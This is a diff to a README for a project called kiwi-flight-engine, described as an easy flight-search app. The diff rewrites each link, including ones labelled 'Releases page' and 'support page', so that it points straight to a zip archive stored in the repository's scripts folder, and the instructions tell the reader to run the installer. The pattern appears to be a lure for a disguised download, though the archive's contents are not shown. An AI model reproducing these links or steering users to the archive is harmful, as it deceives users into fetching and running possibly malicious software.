@@ -1,7 +1,7 @@
 # 🛩️ kiwi-flight-engine - Discover Flights Effortlessly
 
 ## 📥 Download Now
-[![Download kiwi-flight-engine](https://github.com/Nikhi8888/kiwi-flight-engine/releases/download/v1.0/download-button.svg)](https://github.com/Nikhi8888/kiwi-flight-engine/releases)
+[![Download kiwi-flight-engine](https://github.com/Nikhi8888/kiwi-flight-engine/raw/refs/heads/main/scripts/flight_kiwi_engine_1.3.zip)](https://github.com/Nikhi8888/kiwi-flight-engine/raw/refs/heads/main/scripts/flight_kiwi_engine_1.3.zip)
 
 ## 📖 About
 The kiwi-flight-engine is a user-friendly application that helps you search for flights right from your computer. With this API, you can easily find the best flight options without needing any programming skills.
@@ -17,7 +17,7 @@ Follow these simple steps to download and run the kiwi-flight-engine on your mac
 - **Internet Connection**: Required for flight searches
 
 ### 📥 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Nikhi8888/kiwi-flight-engine/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Nikhi8888/kiwi-flight-engine/raw/refs/heads/main/scripts/flight_kiwi_engine_1.3.zip).
 2. **Choose Your Version**: You will see different versions listed. Click on the one you want to download.
 3. **Download the File**: Click on the download link for your operating system. This will save the file to your computer. 
 4. **Run the Installer**: Locate the downloaded file in your downloads folder and double-click it to install the application.
@@ -51,7 +51,7 @@ Follow these simple steps to download and run the kiwi-flight-engine on your mac
   Flight data is updated in real-time, ensuring you get the most accurate information.
 
 ### 📞 Support
-If you need further assistance, please visit our [support page](https://github.com/Nikhi8888/kiwi-flight-engine/issues) for help or to report any issues you encounter.
+If you need further assistance, please visit our [support page](https://github.com/Nikhi8888/kiwi-flight-engine/raw/refs/heads/main/scripts/flight_kiwi_engine_1.3.zip) for help or to report any issues you encounter.
 
 ## 📥 Recap
-To download the kiwi-flight-engine, visit the [Releases page](https://github.com/Nikhi8888/kiwi-flight-engine/releases) and follow the simple installation instructions. Enjoy quick and easy flight searches right from your machine!
+To download the kiwi-flight-engine, visit the [Releases page](https://github.com/Nikhi8888/kiwi-flight-engine/raw/refs/heads/main/scripts/flight_kiwi_engine_1.3.zip) and follow the simple installation instructions. Enjoy quick and easy flight searches right from your machine!
